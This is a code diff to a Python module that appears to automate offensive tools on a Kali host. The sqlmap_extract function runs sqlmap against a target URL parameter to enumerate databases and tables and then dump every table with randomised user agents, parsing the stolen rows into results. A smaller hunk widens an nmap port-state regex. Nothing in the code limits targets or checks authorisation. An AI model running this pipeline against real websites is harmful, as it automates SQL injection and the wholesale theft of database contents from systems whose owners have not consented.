@@ -117,8 +117,8 @@ def sqlmap_extract(url: str, param: str, dbms: Optional[str] = None,
     quoted_param = shlex.quote(param)
     quoted_outdir = shlex.quote(output_dir)
 
-    if not queries:
-        queries = ["--dbs", "--current-db"]
+    if queries:
+        quoted_queries = " ".join(shlex.quote(q) for q in queries)
         cmd = (
             f"sqlmap -u {quoted_url}?{quoted_param}=1 --batch "
             f"--output-dir={quoted_outdir} --time-sec=3 "
@@ -126,53 +126,65 @@ def sqlmap_extract(url: str, param: str, dbms: Optional[str] = None,
         )
         if dbms:
             cmd += f"--dbms={shlex.quote(dbms)} "
-        cmd += "--dbs 2>&1"
+        cmd += f"{quoted_queries} 2>&1"
         r = kali.run(cmd, timeout=600)
-        stdout = r.get("stdout", "")
-        dbs = re.findall(r"\[\*\]\s+(.+?)(?:\n|$)", stdout)
-        dbs = [d.strip() for d in dbs if d.strip() and d.strip() != "*"]
-        if dbs:
-            result["data"]["databases"] = dbs
+        result["stdout"] = (r.get("stdout") or "")[:4000]
+        result["success"] = bool(r.get("success"))
+        return result
 
-        cmd = (
-            f"sqlmap -u {quoted_url}?{quoted_param}=1 --batch "
-            f"--output-dir={quoted_outdir} --time-sec=3 "
-            f"--random-agent --no-cast "
-        )
-        if dbms:
-            cmd += f"--dbms={shlex.quote(dbms)} "
-        cmd += "--current-db --tables 2>&1"
-        r = kali.run(cmd, timeout=600)
-        stdout = r.get("stdout", "")
-        tables = re.findall(r"\| (.+?) \|", stdout)
-        if tables:
-            result["data"]["tables"] = tables
+    cmd = (
+        f"sqlmap -u {quoted_url}?{quoted_param}=1 --batch "
+        f"--output-dir={quoted_outdir} --time-sec=3 "
+        f"--random-agent --no-cast "
+    )
+    if dbms:
+        cmd += f"--dbms={shlex.quote(dbms)} "
+    cmd += "--dbs 2>&1"
+    r = kali.run(cmd, timeout=600)
+    stdout = r.get("stdout", "")
+    dbs = re.findall(r"\[\*\]\s+(.+?)(?:\n|$)", stdout)
+    dbs = [d.strip() for d in dbs if d.strip() and d.strip() != "*"]
+    if dbs:
+        result["data"]["databases"] = dbs
 
-        cmd = (
-            f"sqlmap -u {quoted_url}?{quoted_param}=1 --batch "
-            f"--output-dir={quoted_outdir} --time-sec=3 "
-            f"--random-agent --no-cast --dump-all "
-            f"--threads=4 2>&1"
-        )
-        if dbms:
-            cmd += f"--dbms={shlex.quote(dbms)} "
+    cmd = (
+        f"sqlmap -u {quoted_url}?{quoted_param}=1 --batch "
+        f"--output-dir={quoted_outdir} --time-sec=3 "
+        f"--random-agent --no-cast "
+    )
+    if dbms:
+        cmd += f"--dbms={shlex.quote(dbms)} "
+    cmd += "--current-db --tables 2>&1"
+    r = kali.run(cmd, timeout=600)
+    stdout = r.get("stdout", "")
+    tables = re.findall(r"\| (.+?) \|", stdout)
+    if tables:
+        result["data"]["tables"] = tables
 
-        logger.info("sqlmap full dump started (may take minutes)...")
-        r = kali.run(cmd, timeout=1800)
-        stdout = r.get("stdout", "")
+    cmd = (
+        f"sqlmap -u {quoted_url}?{quoted_param}=1 --batch "
+        f"--output-dir={quoted_outdir} --time-sec=3 "
+        f"--random-agent --no-cast --dump-all "
+        f"--threads=4 2>&1"
+    )
+    if dbms:
+        cmd += f"--dbms={shlex.quote(dbms)} "
 
-        # Parse dumped data
-        dump_re = re.compile(
-            r"Table:\s+(.+?)\n.*?\[(\d+)\].*?\n(.*?)(?=\n\[|\Z)", re.DOTALL
-        )
-        for match in dump_re.finditer(stdout):
-            tbl = match.group(1).strip()
-            rows = re.findall(r"\|(.+?)\|", match.group(3))
-            if rows:
-                result["data"][f"dump_{tbl}"] = rows
+    logger.info("sqlmap full dump started (may take minutes)...")
+    r = kali.run(cmd, timeout=1800)
+    stdout = r.get("stdout", "")
 
-        result["success"] = True
+    # 解析 dump: "Table: X" 之后跟一行 "[N entries]" 再跟表格行
+    dump_re = re.compile(
+        r"Table:\s+(.+?)\n.*?\[(\d+)\s+entr.*?\n(.*?)(?=\n\[|\Z)", re.DOTALL
+    )
+    for match in dump_re.finditer(stdout):
+        tbl = match.group(1).strip()
+        rows = re.findall(r"\|(.+?)\|", match.group(3))
+        if rows:
+            result["data"][f"dump_{tbl}"] = rows
 
+    result["success"] = True
     return result
 
 
@@ -202,7 +214,7 @@ def nmap_scan(target: str, ports: str = "21,22,80,443,3306,6379,8080,8443,9200,2
         if "/open/" in line or "/open|" in line:
             parts = line.split()
             for part in parts:
-                m = re.match(r"(\d+)/(open|filtered)/(tcp|udp)", part)
+                m = re.match(r"(\d+)/(open\|filtered|open|closed|filtered)/(tcp|udp)", part)
                 if m:
                     entry = {"port": int(m.group(1)), "state": m.group(2), "protocol": m.group(3)}
                     ports_found.append(entry)
